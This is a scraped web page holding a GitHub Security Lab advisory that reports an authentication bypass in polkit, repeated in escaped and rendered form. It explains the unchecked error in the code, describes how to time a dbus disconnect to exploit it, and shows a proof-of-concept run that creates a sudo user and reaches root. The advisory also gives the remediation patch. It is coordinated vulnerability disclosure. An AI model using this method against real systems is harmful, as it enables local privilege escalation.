polkit_authorization_result_new (TRUE, FALSE, NULL);\n    goto out;\n  }\n```\n\nNotice that the value of `error` is not checked.\n\n#### Proof of concept exploit\n\nThe attached proof of concept exploit uses this vulnerability to create a new user account with `sudo` privileges. It does so by calling the `CreateUser` method on the `org.freedesktop.Accounts` service. The `CreateUser` method uses polkit to check the authorization. The basic concept of the exploit is to disconnect from `dbus-daemon` before polkit calls the `polkit_system_bus_name_get_creds_sync` function. The slightly tricky part of the exploit is to get the timing right. As mentioned above, most of the callers of `polkit_system_bus_name_get_creds_sync` check the error correctly and will deny the request. If you put a breakpoint on `polkit_system_bus_name_get_creds_sync`, you will see that the vulnerable stack trace doesn&#39;t occur until the sixth time the breakpoint is hit. Therefore, the key to a working exploit is to get the timing right, so that the disconnection happens just before the sixth call to `polkit_system_bus_name_get_creds_sync`. In practice though, it seems to be fairly easy to trigger the vulnerability by trying repeatedly, with a random delay inserted each time.\n\nPlease find the source code for the proof of concept exploit attached. It&#39;s packaged as a [git bundle](https://git-scm.com/docs/git-bundle), which you can unpack like this:\n\n```bash\ngit clone -b main GHSL-2021-074-polkit.bundle\n```\n\nAfter you have unpacked the bundle, you will find a README with further instructions on how to build and run the PoC.\n\nHere&#39;s a sample run:\n\n```bash\nkev@constellation:~$ git clone -b main GHSL-2021-074-polkit.bundle\nCloning into &#39;GHSL-2021-074-polkit&#39;...\nReceiving objects: 100% (8/8), 17.48 KiB | 17.48 MiB/s, done.\nkev@constellation:~$ cd GHSL-2021-074-polkit/\nkev@constellation:~/GHSL-2021-074-polkit$ git submodule update --init\nSubmodule &#39;DBusParse&#39; (https://github.com/kevinbackhouse/DBusParse.git) registered for path &#39;DBusParse&#39;\nCloning into &#39;/home/kev/GHSL-2021-074-polkit/DBusParse&#39;...\nSubmodule path &#39;DBusParse&#39;: checked out &#39;0d28bdc3ba1c6c4e69e125aa394eddd6edb7622f&#39;\nkev@constellation:~/GHSL-2021-074-polkit$ mkdir build\nkev@constellation:~/GHSL-2021-074-polkit$ cd build/\nkev@constellation:~/GHSL-2021-074-polkit/build$ cmake ..\n-- The C compiler identification is GNU 9.3.0\n-- The CXX compiler identification is GNU 9.3.0\n-- Check for working C compiler: /usr/bin/cc\n-- Check for working C compiler: /usr/bin/cc -- works\n-- Detecting C compiler ABI info\n-- Detecting C compiler ABI info - done\n-- Detecting C compile features\n-- Detecting C compile features - done\n-- Check for working CXX compiler: /usr/bin/c++\n-- Check for working CXX compiler: /usr/bin/c++ -- works\n-- Detecting CXX compiler ABI info\n-- Detecting CXX compiler ABI info - done\n-- Detecting CXX compile features\n-- Detecting CXX compile features - done\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/kev/GHSL-2021-074-polkit/build\nkev@constellation:~/GHSL-2021-074-polkit/build$ make\nScanning dependencies of target DBusParse\n[  6%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus.cpp.o\n[ 13%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_auth.cpp.o\n[ 20%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_parse.cpp.o\n[ 26%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_print.cpp.o\n[ 33%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_random.cpp.o\n[ 40%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_serialize.cpp.o\n[ 46%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_utils.cpp.o\n[ 53%] Linking CXX shared library libDBusParse.so\n[ 53%] Built target DBusParse\nScanning dependencies of target DBusParseUtils\n[ 60%] Building CXX object DBusParse/src/DBusParseUtils/CMakeFiles/DBusParseUtils.dir/parse.cpp.o\n[ 66%] Building CXX object DBusParse/src/DBusParseUtils/CMakeFiles/DBusParseUtils.dir/utils.cpp.o\n[ 73%] Linking CXX shared library libDBusParseUtils.so\n[ 73%] Built target DBusParseUtils\nScanning dependencies of target createuser\n[ 80%] Building CXX object CMakeFiles/createuser.dir/createuser.cpp.o\n[ 80%] Building CXX object CMakeFiles/createuser.dir/createuser.cpp.o\n[ 86%] Linking CXX executable createuser\n[ 86%] Built target createuser\nScanning dependencies of target DBusParseUnitTests\n[ 93%] Building CXX object DBusParse/tests/DBusParseUnitTests/CMakeFiles/DBusParseUnitTests.dir/dbus_unit_tests.cpp.o\n[100%] Linking CXX executable DBusParseUnitTests\n[100%] Built target DBusParseUnitTests\nkev@constellation:~/GHSL-2021-074-polkit/build$ ./createuser /var/run/dbus/system_bus_socket boris iaminvincible!\nElapsed time: 5794122 nanoseconds\nSuccessfully created /org/freedesktop/Accounts/User1008 after 2 iterations,\nwith a delay value of 1990058 nanoseconds\nElapsed time: 9143521 nanoseconds\nSuccess!\nkev@constellation:~/GHSL-2021-074-polkit/build$ id boris\nuid=1008(boris) gid=1008(boris) groups=1008(boris),27(sudo)\nkev@constellation:~/GHSL-2021-074-polkit/build$ su - boris\nPassword:\nTo run a command as administrator (user \&quot;root\&quot;), use \&quot;sudo \u003ccommand\u003e\&quot;.\nSee \&quot;man sudo_root\&quot; for details.\n\nboris@constellation:~$ sudo su\n[sudo] password for boris:\nroot@constellation:/home/boris# whoami\nroot\nroot@constellation:/home/boris#\n```\n\n#### Impact\n\nThis issue may lead to local privilege escalation on any Linux system that uses polkit.\n\n#### Remediation\n\nAdd a check for `error != NULL`, like this example (from [`polkit_backend_interactive_authority_check_authorization`](https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkitbackend/polkitbackendinteractiveauthority.c#L910)):\n\n```c\nuser_of_caller = polkit_backend_session_monitor_get_user_for_subject (priv-\u003esession_monitor,\n                                                                      caller, NULL,\n                                                                      \u0026error);\nif (error != NULL)\n  {\n    g_simple_async_result_set_from_error (simple, error);\n    g_simple_async_result_complete (simple);\n    g_object_unref (simple);\n    g_error_free (error);\n    goto out;\n  }\n```\n\n#### Resources\n\nProof of concept exploit: [GHSL-2021-074-polkit.bundle](/uploads/4848937fcc7d601e63684c76d8c3e309/GHSL-2021-074-polkit.bundle)\n\n## Credit\n\nThis issue was discovered and reported by GHSL team member [@kevinbackhouse (Kevin Backhouse)](https://github.com/kevinbackhouse).\n\n## Contact\n\nYou can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2021-074` in any communication regarding this issue.\n\n## Disclosure Policy\n\nThis report is subject to our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).&quot;,&quot;initialTaskCompletionStatus&quot;:{&quot;count&quot;:0,&quot;completed_count&quot;:0},&quot;canCreateIncident&quot;:false,&quot;fullPath&quot;:&quot;polkit/polkit&quot;,&quot;iid&quot;:140,&quot;issuableId&quot;:40527,&quot;issueType&quot;:&quot;issue&quot;,&quot;isHidden&quot;:false,&quot;zoomMeetingUrl&quot;:null,&quot;authorId&quot;:14586,&quot;authorName&quot;:&quot;Kevin Backhouse&quot;,&quot;authorUsername&quot;:&quot;kevinbackhouse&quot;,&quot;authorWebUrl&quot;:&quot;/kevinbackhouse&quot;,&quot;createdAt&quot;:&quot;2021-05-04T20:26:41+00:00&quot;,&quot;isFirstContribution&quot;:false,&quot;serviceDeskReplyTo&quot;:null,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;signInPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;projectPath&quot;:&quot;polkit&quot;,&quot;projectId&quot;:884,&quot;projectNamespace&quot;:&quot;polkit&quot;}" id="js-issuable-app">
<div class="title-container">
<h1 class="gl-heading-1 !gl-m-0">GHSL-2021-074: authentication bypass vulnerability in polkit</h1>
</div>
<div class="description">
<div class="md"><h1 data-sourcepos="1:1-1:66" dir="auto">&#x000A;<a id="user-content-github-security-lab-ghsl-vulnerability-report-ghsl-2021-074" class="anchor" href="#github-security-lab-ghsl-vulnerability-report-ghsl-2021-074" aria-hidden="true"></a>GitHub Security Lab (GHSL) Vulnerability Report: <code data-sourcepos="1:53-1:65">GHSL-2021-074</code>&#x000A;</h1>&#x000A;<p data-sourcepos="3:1-3:171" dir="auto">The <a data-sourcepos="3:5-3:57" href="https://securitylab.github.com" rel="nofollow noreferrer noopener" target="_blank">GitHub Security Lab</a> team has identified potential security vulnerabilities in <a data-sourcepos="3:117-3:170" href="https://gitlab.freedesktop.org/polkit/polkit">polkit</a>.</p>&#x000A;<p data-sourcepos="5:1-5:190" dir="auto">We are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.</p>&#x000A;<p data-sourcepos="7:1-7:185" dir="auto">If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code data-sourcepos="7:114-7:135">securitylab@github.com</code> (please include <code data-sourcepos="7:155-7:167">GHSL-2021-074</code> as a reference).</p>&#x000A;<p data-sourcepos="9:1-9:82" dir="auto">If you are <em data-sourcepos="9:12-9:16">NOT</em> the correct point of contact for this report, please let us know!</p>&#x000A;<h2 data-sourcepos="11:1-11:10" dir="auto">&#x000A;<a id="user-content-summary" class="anchor" href="#summary" aria-hidden="true"></a>Summary</h2>&#x000A;<p data-sourcepos="13:1-13:158" dir="auto">There is an authentication bypass vulnerability in polkit, which enables an unprivileged user to get authorization from polkit to perform a privileged action.</p>&#x000A;<h2 data-sourcepos="15:1-15:10" dir="auto">&#x000A;<a id="user-content-product" class="anchor" href="#product" aria-hidden="true"></a>Product</h2>&#x000A;<p data-sourcepos="17:1-17:54" dir="auto"><a data-sourcepos="17:1-17:54" href="https://gitlab.freedesktop.org/polkit/polkit">polkit</a></p>&#x000A;<h2 data-sourcepos="19:1-19:18" dir="auto">&#x000A;<a id="user-content-tested-versions" class="anchor" href="#tested-versions" aria-hidden="true"></a>Tested Versions</h2>&#x000A;<ul data-sourcepos="21:1-24:0" dir="auto">&#x000A;<li data-sourcepos="21:1-21:61">policykit-1, 0.105-26ubuntu1 (tested on Ubuntu 20.04.2 LTS)</li>&#x000A;<li data-sourcepos="22:1-22:48">policykit-1, 0.105-30 (tested on Ubuntu 21.04)</li>&#x000A;<li data-sourcepos="23:1-24:0">polkit, 0.116-7 (tested on Fedora 32)</li>&#x000A;</ul>&#x000A;<h2 data-sourcepos="25:1-25:10" dir="auto">&#x000A;<a id="user-content-details" class="anchor" href="#details" aria-hidden="true"></a>Details</h2>&#x000A;<h3 data-sourcepos="27:1-27:62" dir="auto">&#x000A;<a id="user-content-issue-1-authentication-bypass-in-polkit-ghsl-2021-074" class="anchor" href="#issue-1-authentication-bypass-in-polkit-ghsl-2021-074" aria-hidden="true"></a>Issue 1: Authentication bypass in polkit (<code data-sourcepos="27:48-27:60">GHSL-2021-074</code>)</h3>&#x000A;<p data-sourcepos="29:1-29:508" dir="auto">The function <a data-sourcepos="29:14-29:151" href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkit/polkitsystembusname.c#L388"><code data-sourcepos="29:16-29:52">polkit_system_bus_name_get_creds_sync</code></a> is used to get the uid and pid of the process requesting the action. It does this by sending the unique bus name of the requesting process, which is typically something like ":1.96", to <code data-sourcepos="29:340-29:350">dbus-daemon</code>. These unique names are assigned and managed by <code data-sourcepos="29:402-29:412">dbus-daemon</code> and cannot be forged, so this is a good way to check the privileges of the requesting process.</p>&#x000A;<p data-sourcepos="31:1-31:951" dir="auto">The vulnerability happens when the requesting process disconnects from <code data-sourcepos="31:73-31:83">dbus-daemon</code> just before the call to <code data-sourcepos="31:111-31:147">polkit_system_bus_name_get_creds_sync</code> starts. In this scenario, the unique bus name is no longer valid, so <code data-sourcepos="31:220-31:230">dbus-daemon</code> sends back an error reply. This error case is handled in <code data-sourcepos="31:291-31:327">polkit_system_bus_name_get_creds_sync</code> by setting the value of the <code data-sourcepos="31:359-31:363">error</code> parameter, but it still returns <code data-sourcepos="31:399-31:402">TRUE</code>, rather than <code data-sourcepos="31:419-31:423">FALSE</code>. We are not sure whether it's a bug that the return value is TRUE when this error happens, but this behavior certainly means that all callers of <code data-sourcepos="31:572-31:608">polkit_system_bus_name_get_creds_sync</code> need to carefully check whether an error was set. If the calling function forgets to check for errors then it will think that the uid of the requesting process is 0 (because the <code data-sourcepos="31:790-31:813">AsyncGetBusNameCredsData</code> struct is zero initialized). In other words, it will think that the action was requested by a root process, and will therefore allow it.</p>&#x000A;<p data-sourcepos="33:1-33:194" dir="auto">Most of the callers of <code data-sourcepos="33:25-33:61">polkit_system_bus_name_get_creds_sync</code> check the error value correctly, and are therefore not vulnerable. But the error value is not checked in the following stack trace:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="35:1-44:3" class="code highlight js-syntax-highlight language-plaintext" lang="plaintext" v-pre="true"><code><span id="LC1" class="line" lang="plaintext">0  in polkit_system_bus_name_get_creds_sync of polkitsystembusname.c:393</span>&#x000A;<span id="LC2" class="line" lang="plaintext">1  in polkit_system_bus_name_get_user_sync of polkitsystembusname.c:511</span>&#x000A;<span id="LC3" class="line" lang="plaintext">2  in polkit_backend_session_monitor_get_user_for_subject of polkitbackendsessionmonitor-systemd.c:303</span>&#x000A;<span id="LC4" class="line" lang="plaintext">3  in check_authorization_sync of polkitbackendinteractiveauthority.c:1113</span>&#x000A;<span id="LC5" class="line" lang="plaintext">4  in check_authorization_sync of polkitbackendinteractiveauthority.c:1223</span>&#x000A;<span id="LC6" class="line" lang="plaintext">5  in polkit_backend_interactive_authority_check_authorization of polkitbackendinteractiveauthority.c:971</span>&#x000A;<span id="LC7" class="line" lang="plaintext">6  in server_handle_check_authorization of polkitbackendauthority.c:795</span>&#x000A;<span id="LC8" class="line" lang="plaintext">7  in server_handle_method_call of polkitbackendauthority.c:1274</span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="46:1-46:186" dir="auto">The bug is in this snippet of code in <a data-sourcepos="46:39-46:185" href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkitbackend/polkitbackendinteractiveauthority.c#L1121"><code data-sourcepos="46:41-46:64">check_authorization_sync</code></a>:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="48:1-63:3" data-canonical-lang="c" class="code highlight js-syntax-highlight language-c" lang="c" v-pre="true"><code><span id="LC1" class="line" lang="c"><span class="cm">/* every subject has a user; this is supplied by the client, so we rely</span></span>&#x000A;<span id="LC2" class="line" lang="c"><span class="cm"> * on the caller to validate its acceptability. */</span></span>&#x000A;<span id="LC3" class="line" lang="c"><span class="n">user_of_subject</span> <span class="o">=</span> <span class="n">polkit_backend_session_monitor_get_user_for_subject</span> <span class="p">(</span><span class="n">priv</span><span class="o">-&gt;</span><span class="n">session_monitor</span><span class="p">,</span></span>&#x000A;<span id="LC4" class="line" lang="c">                                                                       <span class="n">subject</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span></span>&#x000A;<span id="LC5" class="line" lang="c">                                                                       <span class="n">error</span><span class="p">);</span></span>&#x000A;<span id="LC6" class="line" lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">user_of_subject</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span></span>&#x000A;<span id="LC7" class="line" lang="c">    <span class="k">goto</span> <span class="n">out</span><span class="p">;</span></span>&#x000A;<span id="LC8" class="line" lang="c"></span>&#x000A;<span id="LC9" class="line" lang="c"><span class="cm">/* special case: uid 0, root, is _always_ authorized for anything */</span></span>&#x000A;<span id="LC10" class="line" lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">POLKIT_IS_UNIX_USER</span> <span class="p">(</span><span class="n">user_of_subject</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">polkit_unix_user_get_uid</span> <span class="p">(</span><span class="n">POLKIT_UNIX_USER</span> <span class="p">(</span><span class="n">user_of_subject</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span></span>&#x000A;<span id="LC11" class="line" lang="c">  <span class="p">{</span></span>&#x000A;<span id="LC12" class="line" lang="c">    <span class="n">result</span> <span class="o">=</span> <span class="n">polkit_authorization_result_new</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span></span>&#x000A;<span id="LC13" class="line" lang="c">    <span class="k">goto</span> <span class="n">out</span><span class="p">;</span></span>&#x000A;<span id="LC14" class="line" lang="c">  <span class="p">}</span></span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="65:1-65:48" dir="auto">Notice that the value of <code data-sourcepos="65:27-65:31">error</code> is not checked.</p>&#x000A;<h4 data-sourcepos="67:1-67:29" dir="auto">&#x000A;<a id="user-content-proof-of-concept-exploit" class="anchor" href="#proof-of-concept-exploit" aria-hidden="true"></a>Proof of concept exploit</h4>&#x000A;<p data-sourcepos="69:1-69:1096" dir="auto">The attached proof of concept exploit uses this vulnerability to create a new user account with <code data-sourcepos="69:98-69:101">sudo</code> privileges. It does so by calling the <code data-sourcepos="69:143-69:152">CreateUser</code> method on the <code data-sourcepos="69:170-69:193">org.freedesktop.Accounts</code> service. The <code data-sourcepos="69:210-69:219">CreateUser</code> method uses polkit to check the authorization. The basic concept of the exploit is to disconnect from <code data-sourcepos="69:325-69:335">dbus-daemon</code> before polkit calls the <code data-sourcepos="69:363-69:399">polkit_system_bus_name_get_creds_sync</code> function. The slightly tricky part of the exploit is to get the timing right. As mentioned above, most of the callers of <code data-sourcepos="69:524-69:560">polkit_system_bus_name_get_creds_sync</code> check the error correctly and will deny the request. If you put a breakpoint on <code data-sourcepos="69:644-69:680">polkit_system_bus_name_get_creds_sync</code>, you will see that the vulnerable stack trace doesn't occur until the sixth time the breakpoint is hit. Therefore, the key to a working exploit is to get the timing right, so that the disconnection happens just before the sixth call to <code data-sourcepos="69:920-69:956">polkit_system_bus_name_get_creds_sync</code>. In practice though, it seems to be fairly easy to trigger the vulnerability by trying repeatedly, with a random delay inserted each time.</p>&#x000A;<p data-sourcepos="71:1-71:172" dir="auto">Please find the source code for the proof of concept exploit attached. It's packaged as a <a data-sourcepos="71:91-71:139" href="https://git-scm.com/docs/git-bundle" rel="nofollow noreferrer noopener" target="_blank">git bundle</a>, which you can unpack like this:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="73:1-75:3" data-canonical-lang="bash" class="code highlight js-syntax-highlight language-shell" lang="shell" v-pre="true"><code><span id="LC1" class="line" lang="shell">git clone <span class="nt">-b</span> main GHSL-2021-074-polkit.bundle</span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="77:1-77:117" dir="auto">After you have unpacked the bundle, you will find a README with further instructions on how to build and run the PoC.</p>&#x000A;<p data-sourcepos="79:1-79:20" dir="auto">Here's a sample run:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="81:1-153:3" data-canonical-lang="bash" class="code highlight js-syntax-highlight language-shell" lang="shell" v-pre="true"><code><span id="LC1" class="line" lang="shell">kev@constellation:~<span class="nv">$ </span>git clone <span class="nt">-b</span> main GHSL-2021-074-polkit.bundle</span>&#x000A;<span id="LC2" class="line" lang="shell">Cloning into <span class="s1">'GHSL-2021-074-polkit'</span>...</span>&#x000A;<span id="LC3" class="line" lang="shell">Receiving objects: 100% <span class="o">(</span>8/8<span class="o">)</span>, 17.48 KiB | 17.48 MiB/s, <span class="k">done</span><span class="nb">.</span></span>&#x000A;<span id="LC4" class="line" lang="shell">kev@constellation:~<span class="nv">$ </span><span class="nb">cd </span>GHSL-2021-074-polkit/</span>&#x000A;<span id="LC5" class="line" lang="shell">kev@constellation:~/GHSL-2021-074-polkit<span class="nv">$ </span>git submodule update <span class="nt">--init</span></span>&#x000A;<span id="LC6" class="line" lang="shell">Submodule <span class="s1">'DBusParse'</span> <span class="o">(</span>https://github.com/kevinbackhouse/DBusParse.git<span class="o">)</span> registered <span class="k">for </span>path <span class="s1">'DBusParse'</span></span>&#x000A;<span id="LC7" class="line" lang="shell">Cloning into <span class="s1">'/home/kev/GHSL-2021-074-polkit/DBusParse'</span>...</span>&#x000A;<span id="LC8" class="line" lang="shell">Submodule path <span class="s1">'DBusParse'</span>: checked out <span class="s1">'0d28bdc3ba1c6c4e69e125aa394eddd6edb7622f'</span></span>&#x000A;<span id="LC9" class="line" lang="shell">kev@constellation:~/GHSL-2021-074-polkit<span class="nv">$ </span><span class="nb">mkdir </span>build</span>&#x000A;<span id="LC10" class="line" lang="shell">kev@constellation:~/GHSL-2021-074-polkit<span class="nv">$ </span><span class="nb">cd </span>build/</span>&#x000A;<span id="LC11" class="line" lang="shell">kev@constellation:~/GHSL-2021-074-polkit/build<span class="nv">$ </span>cmake ..</span>&#x000A;<span id="LC12" class="line" lang="shell"><span class="nt">--</span> The C compiler identification is GNU 9.3.0</span>&#x000A;<span id="LC13" class="line" lang="shell"><span class="nt">--</span> The CXX compiler identification is GNU 9.3.0</span>&#x000A;<span id="LC14" class="line" lang="shell"><span class="nt">--</span> Check <span class="k">for </span>working C compiler: /usr/bin/cc</span>&#x000A;<span id="LC15" class="line" lang="shell"><span class="nt">--</span> Check <span class="k">for </span>working C compiler: /usr/bin/cc <span class="nt">--</span> works</span>&#x000A;<span id="LC16" class="line" lang="shell"><span class="nt">--</span> Detecting C compiler ABI info</span>&#x000A;<span id="LC17" class="line" lang="shell"><span class="nt">--</span> Detecting C compiler ABI info - <span class="k">done</span></span>&#x000A;<span id="LC18" class="line" lang="shell"><span class="nt">--</span> Detecting C compile features</span>&#x000A;<span id="LC19" class="line" lang="shell"><span class="nt">--</span> Detecting C compile features - <span class="k">done</span></span>&#x000A;<span id="LC20" class="line" lang="shell"><span class="nt">--</span> Check <span class="k">for </span>working CXX compiler: /usr/bin/c++</span>&#x000A;<span id="LC21" class="line" lang="shell"><span class="nt">--</span> Check <span class="k">for </span>working CXX compiler: /usr/bin/c++ <span class="nt">--</span> works</span>&#x000A;<span id="LC22" class="line" lang="shell"><span class="nt">--</span> Detecting CXX compiler ABI info</span>&#x000A;<span id="LC23" class="line" lang="shell"><span class="nt">--</span> Detecting CXX compiler ABI info - <span class="k">done</span></span>&#x000A;<span id="LC24" class="line" lang="shell"><span class="nt">--</span> Detecting CXX compile features</span>&#x000A;<span id="LC25" class="line" lang="shell"><span class="nt">--</span> Detecting CXX compile features - <span class="k">done</span></span>&#x000A;<span id="LC26" class="line" lang="shell"><span class="nt">--</span> Configuring <span class="k">done</span></span>&#x000A;<span id="LC27" class="line" lang="shell"><span class="nt">--</span> Generating <span class="k">done</span></span>&#x000A;<span id="LC28" class="line" lang="shell"><span class="nt">--</span> Build files have been written to: /home/kev/GHSL-2021-074-polkit/build</span>&#x000A;<span id="LC29" class="line" lang="shell">kev@constellation:~/GHSL-2021-074-polkit/build<span class="nv">$ </span>make</span>&#x000A;<span id="LC30" class="line" lang="shell">Scanning dependencies of target DBusParse</span>&#x000A;<span id="LC31" class="line" lang="shell"><span class="o">[</span>  6%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus.cpp.o</span>&#x000A;<span id="LC32" class="line" lang="shell"><span class="o">[</span> 13%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_auth.cpp.o</span>&#x000A;<span id="LC33" class="line" lang="shell"><span class="o">[</span> 20%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_parse.cpp.o</span>&#x000A;<span id="LC34" class="line" lang="shell"><span class="o">[</span> 26%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_print.cpp.o</span>&#x000A;<span id="LC35" class="line" lang="shell"><span class="o">[</span> 33%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_random.cpp.o</span>&#x000A;<span id="LC36" class="line" lang="shell"><span class="o">[</span> 40%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_serialize.cpp.o</span>&#x000A;<span id="LC37" class="line" lang="shell"><span class="o">[</span> 46%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_utils.cpp.o</span>&#x000A;<span id="LC38" class="line" lang="shell"><span class="o">[</span> 53%] Linking CXX shared library libDBusParse.so</span>&#x000A;<span id="LC39" class="line" lang="shell"><span class="o">[</span> 53%] Built target DBusParse</span>&#x000A;<span id="LC40" class="line" lang="shell">Scanning dependencies of target DBusParseUtils</span>&#x000A;<span id="LC41" class="line" lang="shell"><span class="o">[</span> 60%] Building CXX object DBusParse/src/DBusParseUtils/CMakeFiles/DBusParseUtils.dir/parse.cpp.o</span>&#x000A;<span id="LC42" class="line" lang="shell"><span class="o">[</span> 66%] Building CXX object DBusParse/src/DBusParseUtils/CMakeFiles/DBusParseUtils.dir/utils.cpp.o</span>&#x000A;<span id="LC43" class="line" lang="shell"><span class="o">[</span> 73%] Linking CXX shared library libDBusParseUtils.so</span>&#x000A;<span id="LC44" class="line" lang="shell"><span class="o">[</span> 73%] Built target DBusParseUtils</span>&#x000A;<span id="LC45" class="line" lang="shell">Scanning dependencies of target createuser</span>&#x000A;<span id="LC46" class="line" lang="shell"><span class="o">[</span> 80%] Building CXX object CMakeFiles/createuser.dir/createuser.cpp.o</span>&#x000A;<span id="LC47" class="line" lang="shell"><span class="o">[</span> 80%] Building CXX object CMakeFiles/createuser.dir/createuser.cpp.o</span>&#x000A;<span id="LC48" class="line" lang="shell"><span class="o">[</span> 86%] Linking CXX executable createuser</span>&#x000A;<span id="LC49" class="line" lang="shell"><span class="o">[</span> 86%] Built target createuser</span>&#x000A;<span id="LC50" class="line" lang="shell">Scanning dependencies of target DBusParseUnitTests</span>&#x000A;<span id="LC51" class="line" lang="shell"><span class="o">[</span> 93%] Building CXX object DBusParse/tests/DBusParseUnitTests/CMakeFiles/DBusParseUnitTests.dir/dbus_unit_tests.cpp.o</span>&#x000A;<span id="LC52" class="line" lang="shell"><span class="o">[</span>100%] Linking CXX executable DBusParseUnitTests</span>&#x000A;<span id="LC53" class="line" lang="shell"><span class="o">[</span>100%] Built target DBusParseUnitTests</span>&#x000A;<span id="LC54" class="line" lang="shell">kev@constellation:~/GHSL-2021-074-polkit/build<span class="nv">$ </span>./createuser /var/run/dbus/system_bus_socket boris iaminvincible!</span>&#x000A;<span id="LC55" class="line" lang="shell">Elapsed <span class="nb">time</span>: 5794122 nanoseconds</span>&#x000A;<span id="LC56" class="line" lang="shell">Successfully created /org/freedesktop/Accounts/User1008 after 2 iterations,</span>&#x000A;<span id="LC57" class="line" lang="shell">with a delay value of 1990058 nanoseconds</span>&#x000A;<span id="LC58" class="line" lang="shell">Elapsed <span class="nb">time</span>: 9143521 nanoseconds</span>&#x000A;<span id="LC59" class="line" lang="shell">Success!</span>&#x000A;<span id="LC60" class="line" lang="shell">kev@constellation:~/GHSL-2021-074-polkit/build<span class="nv">$ </span><span class="nb">id </span>boris</span>&#x000A;<span id="LC61" class="line" lang="shell"><span class="nv">uid</span><span class="o">=</span>1008<span class="o">(</span>boris<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1008<span class="o">(</span>boris<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1008<span class="o">(</span>boris<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span></span>&#x000A;<span id="LC62" class="line" lang="shell">kev@constellation:~/GHSL-2021-074-polkit/build<span class="nv">$ </span>su - boris</span>&#x000A;<span id="LC63" class="line" lang="shell">Password:</span>&#x000A;<span id="LC64" class="line" lang="shell">To run a <span class="nb">command </span>as administrator <span class="o">(</span>user <span class="s2">"root"</span><span class="o">)</span>, use <span class="s2">"sudo &lt;command&gt;"</span><span class="nb">.</span></span>&#x000A;<span id="LC65" class="line" lang="shell">See <span class="s2">"man sudo_root"</span> <span class="k">for </span>details.</span>&#x000A;<span id="LC66" class="line" lang="shell"></span>&#x000A;<span id="LC67" class="line" lang="shell">boris@constellation:~<span class="nv">$ </span><span class="nb">sudo </span>su</span>&#x000A;<span id="LC68" class="line" lang="shell"><span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>boris:</span>&#x000A;<span id="LC69" class="line" lang="shell">root@constellation:/home/boris# <span class="nb">whoami</span></span>&#x000A;<span id="LC70" class="line" lang="shell">root</span>&#x000A;<span id="LC71" class="line" lang="shell">root@constellation:/home/boris#</span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h4 data-sourcepos="155:1-155:11" dir="auto">&#x000A;<a id="user-content-impact" class="anchor" href="#impact" aria-hidden="true"></a>Impact</h4>&#x000A;<p data-sourcepos="157:1-157:87" dir="auto">This issue may lead to local privilege escalation on any Linux system that uses polkit.</p>&#x000A;<h4 data-sourcepos="159:1-159:16" dir="auto">&#x000A;<a id="user-content-remediation" class="anchor" href="#remediation" aria-hidden="true"></a>Remediation</h4>&#x000A;<p data-sourcepos="161:1-161:237" dir="auto">Add a check for <code data-sourcepos="161:18-161:30">error != NULL</code>, like this example (from <a data-sourcepos="161:58-161:235" href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkitbackend/polkitbackendinteractiveauthority.c#L910"><code data-sourcepos="161:60-161:115">polkit_backend_interactive_authority_check_authorization</code></a>):</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="163:1-175:3" data-canonical-lang="c" class="code highlight js-syntax-highlight language-c" lang="c" v-pre="true"><code><span id="LC1" class="line" lang="c"><span class="n">user_of_caller</span> <span class="o">=</span> <span 